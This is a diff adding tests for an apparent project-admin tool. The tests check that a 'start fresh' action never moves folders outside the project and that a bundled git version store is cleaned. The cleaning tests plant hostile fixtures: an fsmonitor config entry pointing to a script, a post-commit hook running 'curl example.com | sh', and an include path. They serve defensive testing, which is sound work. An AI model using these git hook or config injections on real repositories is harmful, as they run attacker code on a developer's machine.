@@ -9,6 +9,9 @@ import {
   cameWithAccounts,
   cleanVersionStore,
   dataBeforeName,
+  projectDataPaths,
+  strictlyInside,
+  tidyVersionStore,
   enginePin,
   envValue,
   newSecret,
@@ -188,6 +191,28 @@ describe('data with no key: the three answers', () => {
     expect(readdirSync(root).filter((name) => name.startsWith('data.before')).sort()).toEqual(['data.before-2026-10-09', 'data.before-2026-10-09-2']);
   });
 
+  it('"Start the data fresh" never moves a folder that is not inside the project: the project itself, or a place outside it', () => {
+    const outside = mkdtempSync(join(tmpdir(), 'adminium-folder-outside-'));
+    try {
+      writeFileSync(join(outside, 'meta.db'), 'somebody’s rows');
+      for (const dataDir of [outside, root]) {
+        expect(resolveMissingKey(root, { dataDir }, { kind: 'fresh' }, { secret: () => 'n1' })).toMatchObject({ ok: false, reason: 'failed' });
+        expect(existsSync(join(outside, 'meta.db'))).toBe(true);
+        expect(existsSync(join(root, '.env'))).toBe(false);
+      }
+      expect(strictlyInside(root, join(root, 'nowhere'))).toBe(false);
+    } finally {
+      rmSync(outside, { recursive: true, force: true });
+    }
+  });
+
+  it('says where a project keeps its data, whatever its .env calls it', () => {
+    expect(projectDataPaths(root)).toEqual([join(root, 'data')]);
+    writeFileSync(join(root, '.env'), 'DATABASE_URL=sqlite:./storage/app.sqlite\nADMINIUM_DATA_DIR=./storage\n');
+    const file = join(root, 'storage', 'app.sqlite');
+    expect(projectDataPaths(root)).toEqual([file, `${file}-wal`, `${file}-shm`, `${file}-journal`, join(root, 'storage')]);
+  });
+
   it('"Go on with a new key": the data stays, and the key is new', () => {
     data();
     writeFileSync(join(root, '.env'), 'ADMINIUM_SECRET=\nA=1\n');
@@ -214,6 +239,29 @@ describe('a version store that travelled', () => {
     expect(existsSync(join(store, 'hooks'))).toBe(false);
     expect(existsSync(join(store, 'objects'))).toBe(true);
   });
+  it('at a later opening: a store as git wrote it is left alone; one that gained a setting or a hook is cleaned', () => {
+    const store = join(root, '.adminium', 'designer', 'versions.git');
+    mkdirSync(join(store, 'hooks'), { recursive: true });
+    writeFileSync(join(store, 'HEAD'), 'ref: refs/heads/x\n');
+    const asGitWrote = '[core]\n\trepositoryformatversion = 0\n\tfilemode = false\n\tbare = true\n\tignorecase = true\n\tprecomposeunicode = true\n';
+    writeFileSync(join(store, 'config'), asGitWrote);
+    writeFileSync(join(store, 'hooks', 'pre-commit.sample'), '#!/bin/sh\n');
+    expect(tidyVersionStore(root)).toBe(false);
+    expect(readFileSync(join(store, 'config'), 'utf8')).toBe(asGitWrote);
+
+    // Files unpacked over the project brought a program for git to run.
+    writeFileSync(join(store, 'config'), `${asGitWrote}\tfsmonitor = /tmp/run-me.sh\n`);
+    expect(tidyVersionStore(root)).toBe(true);
+    expect(readFileSync(join(store, 'config'), 'utf8')).not.toContain('fsmonitor');
+    mkdirSync(join(store, 'hooks'), { recursive: true });
+    writeFileSync(join(store, 'hooks', 'post-commit'), '#!/bin/sh\ncurl example.com | sh\n');
+    expect(tidyVersionStore(root)).toBe(true);
+    expect(existsSync(join(store, 'hooks'))).toBe(false);
+    writeFileSync(join(store, 'config'), '[core]\n\tbare = true\n[include]\n\tpath = /tmp/theirs\n');
+    expect(tidyVersionStore(root)).toBe(true);
+    expect(tidyVersionStore(join(root, 'no-store'))).toBe(false);
+  });
+
   it('does nothing for a folder with no store', () => {
     expect(cleanVersionStore(root)).toBe(false);
     expect(existsSync(join(root, '.adminium'))).toBe(false);
